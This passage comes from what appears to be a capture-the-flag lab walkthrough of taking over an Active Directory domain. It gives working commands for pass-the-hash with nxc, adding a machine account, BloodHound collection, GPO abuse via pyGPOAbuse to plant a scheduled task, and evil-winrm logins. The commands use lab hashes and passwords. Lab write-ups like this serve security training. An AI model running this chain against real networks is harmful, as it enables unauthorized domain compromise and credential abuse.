* Adding credentials explicitly: `Invoke-BloodHound -Domain hsm.local -DomainController DC01.hsm.local -LdapUsername "hsm\Administrator" -LdapPassword "yourpassword" -zipfilename hsm_loot` (or use UPN format like `[**Administrator@hsm.local**](mailto:Administrator@hsm.local)`).
* To do this we can add a new machine account on the domain controller. In that way, we can be able to set our own password

### **Adding domain computer**

* First we check the Maq of **bbarkinson**.
* Machine Account Quota on any domain is set to 10 so any user can create up to 10 machine account on the domain

```bash
nxc ldap 10.0.18.37 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc -M maq
```

![image.png](<../../.gitbook/assets/image 68 (2).png>)

* This means that **Any authenticated domain user** (including `bbarkinson`) can create **up to 10 computer accounts** in the domain.

```bash
nxc smb  10.0.18.37 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'   -M add-computer -o NAME="RedBlue" PASSWORD='RedBlue777' --dns-server 10.0.18.37
```

![image.png](<../../.gitbook/assets/image 69 (2).png>)

* Now you can execute SharpHound.ps1 by providing the machine account's username and password credentials

```bash
Invoke-BloodHound  -Domain hsm.local -DomainController DC01.hsm.local -zipfilename hsm_loot --ldapusername 'RedBlue$' --ldappassword 'RedBlue777'

Invoke-BloodHound -Domain hsm.local -DomainController DC01.hsm.local -ZipFilename hsm_loot -LdapUsername 'RedBlue$' -LdapPassword 'RedBlue777'

```

![image.png](<../../.gitbook/assets/image 70 (2).png>)

![image.png](<../../.gitbook/assets/image 71 (2).png>)

* BOOOOOOM At last!!!!!!!!!!!!!

### Transferring the loot from Windows to My Kali

```bash
 smbclient //10.0.19.36/C$ -U ghill_sa
```

![image.png](<../../.gitbook/assets/image 72 (2).png>)

![image.png](<../../.gitbook/assets/image 73 (2).png>)

## Bloodhound

![image.png](<../../.gitbook/assets/image 74 (2).png>)

![image.png](<../../.gitbook/assets/image 75 (2).png>)

![image.png](<../../.gitbook/assets/image 76 (2).png>)

![image.png](<../../.gitbook/assets/image 77 (2).png>)

* The user `BBARKINSON@HSM.LOCAL` has generic write access to the `GPO FINANCE POLICY@HSM.LOCAL`.
* `Generic Write access` grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user.
* With GenericWrite over a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task
* \[`pyGPOAbuse.py](http://pygpoabuse.py/)` can be used for that purpose. https://github.com/Hackndo/pyGPOAbuse

![image.png](<../../.gitbook/assets/image 78 (2).png>)

![image.png](<../../.gitbook/assets/image 79 (1).png>)

![image.png](<../../.gitbook/assets/image 80 (1).png>)

```bash
python3 pygpoabuse.py hsm.local/bbarkinson -hashes ':53c3709ae3d9f4428a230db81361ffbc' -gpo-id 526CDF3A-10B6-4B00-BCFA-36E59DCD71A2-f
```

![image.png](<../../.gitbook/assets/image 81 (1).png>)

* pyGPOAbuse successfully created a scheduled task named `TASK_0ca6ae7f` in GPO `526CDF3A-10B6-4B00-BCFA-36E59DCD71A2` using bbarkinson credentials.

**Verifying Success**

```bash
nxc smb DC01.hsm.local -u 'john' -p 'H4x00r123..' BOOOOOOOOOOOOOOOOOOOM we get `PWN3D!`
```

![image.png](<../../.gitbook/assets/image 82 (1).png>)

```bash
evil-winrm -i DC01.hsm.local -u 'john' -p 'H4x00r123..'
evil-winrm -i 10.0.18.37 -u john -p 'H4x00r123..'
```

* WELLLLL AND THATS JUST ABOUT IT
* OUR FLAG IS RIGHT IN THERE.
* TRY TO REPRODUCE THESE STEPS AND RECOVER THE FLAG
* UNTIL NEXT TIMEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE

![image.png](<../../.gitbook/assets/image 83 (1).png>)
